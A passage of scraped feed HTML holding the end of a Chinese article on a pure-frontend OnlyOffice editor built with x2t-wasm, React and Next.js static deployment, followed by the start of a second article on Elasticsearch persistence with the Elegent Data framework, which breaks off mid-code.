  <span class="hljs-attr">isNew</span>: <span class="hljs-literal">false</span>,            <span class="hljs-comment">// 是否新建文档</span>
  <span class="hljs-attr">readOnly</span>: <span class="hljs-literal">false</span>,        <span class="hljs-comment">// 是否只读</span>
  <span class="hljs-attr">lang</span>: <span class="hljs-string">'zh'</span>,             <span class="hljs-comment">// 界面语言</span>
});

<span class="hljs-comment">// 导出文档</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">export</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'导出成功:'</span>, result);
</code></pre>
<h3 data-id="heading-18">React组件集成</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/app/excel/page.tsx</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ExcelPageContent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [readOnly, setReadOnly] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> [currentLang, setCurrentLang] = useState&lt;<span class="hljs-string">'zh'</span> | <span class="hljs-string">'en'</span>&gt;(<span class="hljs-string">'zh'</span>);
  
  <span class="hljs-comment">// 上传文档</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleView</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">fileName: <span class="hljs-built_in">string</span>, file?: File</span>) =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">initializeOnlyOffice</span>();
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">createEditorView</span>({
      file,
      fileName,
      <span class="hljs-attr">isNew</span>: !file,
      readOnly,
      <span class="hljs-attr">lang</span>: currentLang,
    });
  };
  
  <span class="hljs-comment">// 导出文档</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleExport</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">export</span>();
    <span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertBinToDocument</span>(
      result.<span class="hljs-property">binData</span>, 
      result.<span class="hljs-property">fileName</span>,
      <span class="hljs-variable constant_">FILE_TYPE</span>.<span class="hljs-property">XLSX</span>, 
      result.<span class="hljs-property">media</span>
    );
    <span class="hljs-comment">// 下载文件...</span>
  };
  
  <span class="hljs-comment">// 切换只读模式</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleReadOnly</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> newReadOnly = !readOnly;
    <span class="hljs-title function_">setReadOnly</span>(newReadOnly);
    <span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">setReadOnly</span>(newReadOnly);
  };
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      {/* UI组件 */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-19">项目结构</h2>
<pre><code class="hljs language-csharp" lang="csharp">mvp-onlyoffice/
├── src/
│   ├── app/              <span class="hljs-meta"># Next.js 应用页面</span>
│   │   ├── excel/        <span class="hljs-meta"># Excel 编辑器页面</span>
│   │   ├── docs/         <span class="hljs-meta"># Word 编辑器页面</span>
│   │   └── ppt/          <span class="hljs-meta"># PowerPoint 编辑器页面</span>
│   ├── onlyoffice-comp/  <span class="hljs-meta"># OnlyOffice 组件库</span>
│   │   └── lib/
│   │       ├── editor-manager.ts  <span class="hljs-meta"># 编辑器管理器</span>
│   │       ├── x2t.ts             <span class="hljs-meta"># 文档转换模块</span>
│   │       ├── eventbus.ts        <span class="hljs-meta"># 事件总线</span>
│   │       └── utils.ts            <span class="hljs-meta"># 工具函数</span>
│   └── components/       <span class="hljs-meta"># 通用组件</span>
├── <span class="hljs-keyword">public</span>/               <span class="hljs-meta"># 静态资源</span>
│   ├── web-apps/         <span class="hljs-meta"># OnlyOffice Web 应用资源</span>
│   ├── sdkjs/            <span class="hljs-meta"># OnlyOffice SDK 资源</span>
│   └── wasm/             <span class="hljs-meta"># WebAssembly 转换器</span>
└── onlyoffice-x2t-wasm/  <span class="hljs-meta"># x2t-wasm 源码</span>
</code></pre>
<h2 data-id="heading-20">部署方案</h2>
<h3 data-id="heading-21">Vercel一键部署</h3>
<p>项目已配置静态导出，可直接部署到Vercel：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装依赖</span>
npm install

<span class="hljs-comment"># 构建项目</span>
npm run build

<span class="hljs-comment"># Vercel 会自动检测并部署</span>
</code></pre>
<p>🌐 <strong>在线演示</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-onlyoffice.vercel.app%2F" target="_blank" title="https://mvp-onlyoffice.vercel.app/" ref="nofollow noopener noreferrer">mvp-onlyoffice.vercel.app/</a></p>
<h3 data-id="heading-22">静态文件部署</h3>
<p>项目支持静态导出，构建后的文件可部署到任何静态托管服务：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 构建静态文件</span>
npm run build

<span class="hljs-comment"># 输出目录: out/</span>
<span class="hljs-comment"># 可直接部署到 GitHub Pages、Netlify、Nginx 等</span>
</code></pre>
<h2 data-id="heading-23">技术优势总结</h2>













































<table><thead><tr><th>特性</th><th>传统方案</th><th>本方案</th></tr></thead><tbody><tr><td>数据安全</td><td>❌ 需要上传服务器</td><td>✅ 完全本地处理</td></tr><tr><td>部署成本</td><td>❌ 需要后端服务</td><td>✅ 纯静态部署</td></tr><tr><td>格式支持</td><td>⚠️ 有限格式</td><td>✅ 30+种格式</td></tr><tr><td>离线使用</td><td>❌ 需要网络</td><td>✅ 完全离线</td></tr><tr><td>性能优化</td><td>⚠️ 依赖网络</td><td>✅ IndexedDB缓存</td></tr><tr><td>国际化</td><td>⚠️ 需额外配置</td><td>✅ 内置支持</td></tr><tr><td>权限控制</td><td>⚠️ 复杂实现</td><td>✅ 简单API</td></tr></tbody></table>
<h2 data-id="heading-24">技术原理</h2>
<h3 data-id="heading-25">使用x2t-wasm替代OnlyOffice服务</h3>
<p>传统OnlyOffice集成需要：</p>
<ol>
<li>搭建OnlyOffice Document Server</li>
<li>配置文档转换服务</li>
<li>处理文档上传下载</li>
<li>管理服务器资源</li>
</ol>
<p>本方案通过WASM技术：</p>
<ol>
<li>在浏览器中直接运行x2t转换引擎</li>
<li>使用虚拟文件系统处理文档</li>
<li>完全客户端化，无需服务器</li>
</ol>
<h3 data-id="heading-26">参考项目</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FQihoo360%2Fse-office" target="_blank" title="https://github.com/Qihoo360/se-office" ref="nofollow noopener noreferrer">Qihoo360/se-office</a> - se-office扩展，提供基于开放标准的全功能办公生产力套件</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcryptpad%2Fonlyoffice-x2t-wasm" target="_blank" title="https://github.com/cryptpad/onlyoffice-x2t-wasm" ref="nofollow noopener noreferrer">cryptpad/onlyoffice-x2t-wasm</a> - CryptPad WebAssembly文件转换工具</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Franuts%2Fdocument" target="_blank" title="https://github.com/ranuts/document" ref="nofollow noopener noreferrer">ranuts/document</a> - 参考静态资源实现</li>
</ul>
<h2 data-id="heading-27">开源地址</h2>
<p>🔗 <strong>GitHub仓库</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyour-username%2Fmvp-onlyoffice" target="_blank" title="https://github.com/your-username/mvp-onlyoffice" ref="nofollow noopener noreferrer">mvp-onlyoffice</a></p>
<h2 data-id="heading-28">总结</h2>
<p>本项目提供了一个完整的纯前端OnlyOffice集成方案，通过WASM技术实现了文档格式转换的本地化，结合React和OnlyOffice SDK，打造了一个功能完善、性能优秀的文档编辑器。</p>
<p><strong>核心亮点</strong>：</p>
<ul>
<li>🚀 纯前端架构，无需后端服务</li>
<li>🔒 数据完全本地化，保护隐私安全</li>
<li>⚡ 基于WASM的高性能转换</li>
<li>🌏 内置国际化支持</li>
<li>📦 支持导入导出</li>
<li>🔐 灵活的权限控制</li>
</ul>
<p>欢迎Star和Fork，一起推动前端Office编辑技术的发展！</p>
<hr/>
<p><strong>相关阅读</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapi.onlyoffice.com%2Fzh-CN%2Fdocs%2Fdocs-api%2Fusage-api%2Fconfig%2Fdocument%2F" target="_blank" title="https://api.onlyoffice.com/zh-CN/docs/docs-api/usage-api/config/document/" ref="nofollow noopener noreferrer">OnlyOffice API 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebassembly.org%2F" target="_blank" title="https://webassembly.org/" ref="nofollow noopener noreferrer">WebAssembly 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fdocs%2Fapp%2Fbuilding-your-application%2Fdeploying%2Fstatic-exports" target="_blank" title="https://nextjs.org/docs/app/building-your-application/deploying/static-exports" ref="nofollow noopener noreferrer">Next.js 静态导出</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[面试日志elk之ES数据查询与数据同步]]></title>    <link>https://juejin.cn/post/7575425466904739903</link>    <guid>https://juejin.cn/post/7575425466904739903</guid>    <pubDate>2025-11-23T08:36:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575425466904739903" data-draft-id="7575442779038793770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="面试日志elk之ES数据查询与数据同步"/> <meta itemprop="keywords" content="后端,面试,架构"/> <meta itemprop="datePublished" content="2025-11-23T08:36:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="360_go_php"/> <meta itemprop="url" content="https://juejin.cn/user/2436173498956695"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            面试日志elk之ES数据查询与数据同步
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173498956695/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    360_go_php
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:36:47.000Z" title="Sun Nov 23 2025 08:36:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<h2 data-id="heading-0">1.ES持久层技术<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e71b2815054e41c3a5854e4d2a53f1ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=jlTZBLahH27cIf3s5ZhjweZlzgY%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h2>
<h3 data-id="heading-1">1.1 ES应用场景<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b3f551db8dd4c08b1dfbaa0ad5a3201~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=0BUiIMFn0j%2B1rVYQAvsEZ8InnAA%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h3>
<p><strong>1全文搜索</strong></p>
<p>Elasticsearch可以用于实现全文搜索功能，例如搜索引擎、文档管理系统、电子商务搜索等。它支持复杂的查询语句、中文分词、近似搜索等功能，可以快速地搜索并返回匹配的结果。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3938e6b79c648f2ae9599c9e4f88772~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=T8yNTzVvHw24z45TTIZ%2FnYVi9%2FE%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</p>
<p><strong>2日志分析</strong></p>
<p>Elasticsearch可以用于实现实时日志分析，例如监控系统、异常日志分析等。它可以快速地索引和搜索大量的日志数据，并支持聚合、可视化等功能，可以帮助用户快速定位和解决问题。 <strong>ELK</strong></p>
<p><strong>3业务分析</strong></p>
<p>Elasticsearch可以用于实现业务分析，例如企业数据分析、市场调研等。它可以对海量数据进行搜索、聚合和分析，支持多种数据格式和数据源，例如数据库、日志、网页等，可以帮助用户了解业务情况、市场趋势等。</p>
<p><strong>4搜索推荐</strong></p>
<p>Elasticsearch可以用于实现搜索推荐功能，例如电商搜索推荐、新闻推荐等。它可以根据用户的搜索历史、行为等数据，进行个性化推荐，并支持实时更新和调整推荐结果。</p>
<p><strong>5地理信息系统</strong></p>
<p>Elasticsearch可以用于实现地理信息系统，例如地图搜索、位置分析等。它支持地理坐标索引和查询，可以快速地搜索和聚合地理数据，并支持地图可视化等功能。 <strong>GEO</strong></p>
<h3 data-id="heading-2">1.2 Elasticsearch持久层技术盘点</h3>
<ol>
<li><strong>Elasticsearch官方提供的Java客户端</strong>： Elasticsearch官方提供了Java客户端（<strong>High-Level REST Client和Low-Level REST Client</strong>），可以通过Java代码与ES进行交互。这些客户端提供了各种API和方法，用于执行索引、搜索、更新、删除等操作，并且支持与ES集群的连接和通信。</li>
<li><strong>Spring Data Elasticsearch</strong>： Spring Data Elasticsearch是SpringData框架提供的一个模块，用于简化与Elasticsearch的集成和操作。对于比较简单的查询操作，Spring Data Elasticsearch可以比较简便地实现查询功能，但是对于比较复杂的查询，<strong>Spring Data Elasticsearch使用起来依然比较繁琐</strong>，而且它的版本更新速度跟不上 Elasticsearch官方版本的更新速度，所以企业应用较少。</li>
<li><strong>Jest</strong>： Jest是一个开源的Java HTTP客户端库，专门用于与Elasticsearch进行交互。它提供了一组易于使用的API和方法，可以执行索引、搜索、更新、删除等操作。Jest具有良好的可扩展性和灵活性，并且支持与ES集群的连接和通信。</li>
<li><strong>Transport Client</strong>（已弃用）： Transport Client是Elasticsearch早期版本中提供的Java客户端，自Elasticsearch 7.0版本起，<strong>Transport Client已被官方弃用</strong>。</li>
<li><strong>Elegent Data Elasticsearch</strong>：Elegent Data Elasticsearch是Elegent Data的子框架。Elegent Data是传智教育研究院开发的一款针对NoSQL的持久层框架。Elegent Data Elasticsearch 改变了大家头疼的Elasticsearch持久化操作的难题。因为它可以<strong>让用户按照myBatisPlus的风格来操作Elasticsearch</strong>，轻松上手。</li>
</ol>
<p>使用Elegent Data Elasticsearch框架，可以让你的程序更优雅。我们选择Elegent Data Elasticsearch框架。</p>
<h3 data-id="heading-3">1.3 Elegent Data</h3>
<h4 data-id="heading-4">1.3.1 Elegent Data 简介</h4>
<p>Elegent Data是一个优雅的NoSQL数据持久层框架。</p>
<p>（1）使用这个组件可以让你更轻松、更优雅地在项目中操作 Elasticsearch 等NoSQL数据库，风格类似于MyBatisPlus，让你更专注业务代码的开发。</p>
<p>（2）支持用户自行扩展。</p>
<p>开源项目地址 ：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fchuanzhiliubei%2Felegent-data" title="https://gitee.com/chuanzhiliubei/elegent-data" target="_blank" ref="nofollow noopener noreferrer">gitee.com/chuanzhiliu…</a></p>
<p>我们看一下Elegent Data框架的系统架构图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e56b9e8f6cc44070b5a8a06ba7b073bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=3J7j7sFyDBiZWTDsJIXsqHnLAIE%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h4 data-id="heading-5">1.3.2 Elegent Data Elasticsearch快速入门</h4>
<p>（1）在pom文件中添加依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.data<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-data-elasticsearch7<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）application.yml添加配置</p>
<pre><code class="hljs language-less" lang="less">spring:
  elasticsearch:
    <span class="hljs-attribute">rest</span>:
      <span class="hljs-attribute">uris</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.0.0.1:9201</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）创建DTO</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderDTO</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Long</span> id;<span class="hljs-comment">//id</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> orderNo;<span class="hljs-comment">//订单编号</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> innerCode;<span class="hljs-comment">//机器编号</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> addr;<span class="hljs-comment">//点位地址</span>
  
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Long</span> skuId;<span class="hljs-comment">//商品id</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> skuName;<span class="hljs-comment">//商品名称</span>
  
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Integer</span> status;<span class="hljs-comment">//订单状态:0-创建;1-支付完成;2-出货成功;3-出货失败;</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Integer</span> amount;<span class="hljs-comment">//支付金额</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Integer</span> bill;<span class="hljs-comment">//分账金额</span>

    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Integer</span> price;<span class="hljs-comment">//商品金额</span>
  
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（4）创建服务类</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-meta">@Component</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OrderEsService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Elasticsearch7DataService&lt;OrderDTO&gt;</span> </span>{

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（5）创建Controller类，测试分页查询、列表查询、增加、删除、修改操作。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">"/order"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">OrderEsService</span> orderEsService;


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/page"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Pager</span>&lt;<span class="hljs-title class_">OrderDTO</span>&gt; <span class="hljs-title function_">findPage</span>(<span class="hljs-params"/>){
        <span class="hljs-title class_">ElegentQueryWapper</span> elegentQueryWapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ElegentQueryWapper</span>();
        elegentQueryWapper.<span class="hljs-title function_">from</span>(<span class="hljs-string">"order"</span>)
                .<span class="hljs-title function_">eq</span>(<span class="hljs-string">"status"</span>,<span class="hljs-string">"1"</span>)
                .<span class="hljs-title function_">eq</span>(<span class="hljs-string">"sku_name"</span>,<span class="hljs-string">"统一奶茶"</span>);
        <span class="hljs-keyword">return</span>  orderEsService.<span class="hljs-title function_">page</span>(elegentQueryWapper,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>);
    }

    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/list"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">OrderDTO</span>&gt; <span class="hljs-title function_">findList</span>(<span class="hljs-params"/>){
        <span class="hljs-title class_">ElegentQueryWapper</span> elegentQueryWapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ElegentQueryWapper</span>();
        elegentQueryWapper.<span class="hljs-title function_">from</span>(<span class="hljs-string">"order"</span>);
        <span class="hljs-keyword">return</span>  orderEsService.<span class="hljs-title function_">list</span>(elegentQueryWapper);
    }


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/statistics"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">StatisticsVo</span>&gt; <span class="hljs-title function_">findStatistics</span>(<span class="hljs-params"/>){
        <span class="hljs-title class_">ElegentQueryWapper</span> queryWapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ElegentQueryWapper</span>();
        queryWapper.<span class="hljs-title function_">from</span>(<span class="hljs-string">"order"</span>)
                .<span class="hljs-title function_">eq</span>(<span class="hljs-string">"status"</span>,<span class="hljs-string">"1"</span>)
                .<span class="hljs-title function_">count</span>(<span class="hljs-string">"price"</span>).<span class="hljs-title function_">groupBy</span>(<span class="hljs-string">"sku_id"</span>);
        <span class="hljs-keyword">return</span>  orderEsService.<span class="hljs-title function_">statistics</span>(queryWapper);
    }


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/save"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"/>){
        <span class="hljs-title class_">OrderDTO</span> orderDTO=<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderDTO</span>();
        orderDTO.<span class="hljs-title function_">setId</span>(200L);
        orderDTO.<span class="hljs-title function_">setAddr</span>(<span class="hljs-string">"测试地址"</span>);
        orderDTO.<span class="hljs-title function_">setStatus</span>(<span class="hljs-number">1</span>);
        orderEsService.<span class="hljs-title function_">save</span>(<span class="hljs-string">"order"</span>,orderDTO.<span class="hljs-title function_">getId</span>()+<span class="hljs-string">""</span>,orderDTO);
    }


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/update"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>){
        <span class="hljs-title class_">OrderDTO</span> orderDTO=<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderDTO</span>();
        orderDTO.<span class="hljs-title function_">setId</span>(200L);
        orderDTO.<span class="hljs-title function_">setAddr</span>(<span class="hljs-string">"地址测试"</span>);
